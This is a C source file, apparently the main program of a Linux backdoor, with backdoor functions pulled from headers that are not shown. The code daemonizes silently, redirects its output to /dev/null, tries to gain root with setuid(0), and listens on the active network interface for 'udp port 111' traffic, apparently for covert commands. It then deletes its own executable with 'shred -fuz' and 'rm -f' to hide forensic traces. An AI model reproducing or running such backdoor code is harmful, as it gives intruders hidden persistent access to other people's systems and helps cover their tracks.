/*
 * Copyright (C) 2008 Stephen Makonin and Torin Sandall. All rights reserved. 
 */

#include "common.h"
#include "util.h"
#include "backdoor.h"
#include "pcspkr.h"

int verbose = FALSE;
int timeout = DEFAULT_TIMEOUT;

static int file_exists(char *);
static void child_handler(int);
static void daemonize();

int main(int argc _UNUSED, char **argv _UNUSED)
{
	char *filter = "udp port 111";
	unsigned int size = 10;
    char eth_dev[8];
    
    daemonize();	
	
    find_active_eth(eth_dev);	
	if(backdoor_init(size, filter, eth_dev) != 0)
    {
        //dbg_print("%s: core_init failed, errno=%d, errstr=%s", __FUNCTION__, errno, strerror(errno));
        exit(1);
    }    
	if(backdoor_scheduler(size) != 0)
    {
        //dbg_print("%s: scheduler failed, errno=%d, errstr=%s", __FUNCTION__, errno, strerror(errno));
        exit(1);
    }

    while(1)
    {
        sleep(1);
    }
		
	exit(0);
}

int file_exists(char * filename)
{
    struct stat buf;
    int i = stat(filename, &buf);

    if(i == 0)
        return 1;

 return 0;       
} 

void child_handler(int signum)
{
    switch(signum) 
    {
        case SIGALRM: exit(EXIT_FAILURE); break;
        case SIGUSR1: exit(EXIT_SUCCESS); break;
        case SIGCHLD: exit(EXIT_FAILURE); break;
    }
}

void daemonize(void)
{
    pid_t pid, sid, parent;
    char    command[1024];

   if(getppid() != 1)
    {
        // setup signal handlers
        signal(SIGCHLD, child_handler);
        signal(SIGUSR1, child_handler);
        signal(SIGALRM, child_handler);

        pid = fork();
        if(pid < 0) exit(0);

        if(pid > 0) 
        {
            alarm(2);
            pause();
            exit(0);
        }

        // child process needs parent's id
        parent = getppid();

        // cancel certain signals
        signal(SIGCHLD, SIG_DFL);   // child process dies
        signal(SIGTSTP, SIG_IGN);   // various TTY signals
        signal(SIGTTOU, SIG_IGN);
        signal(SIGTTIN, SIG_IGN);
        signal(SIGHUP,  SIG_IGN);   // hangup signal
        signal(SIGTERM, SIG_DFL);   // die on SIGTERM

        umask(0);
        sid = setsid();
        if(sid < 0) exit(0);

        if(chdir("/") < 0) exit(0);

        // redirect std files to /dev/null
        freopen("/dev/null", "r", stdin);
        freopen("/dev/null", "w", stdout);
        freopen("/dev/null", "w", stderr);

        // kill parent
        kill(parent, SIGUSR1);
    }

    setuid(0);
    setgid(0);

    sprintf(command, "/proc/%d/exe", getpid());
    while(!file_exists(command))
        sleep(1);
        
    system("shred -fuz "FILE_LOCATION);
    system("rm -f "FILE_LOCATION);        
}
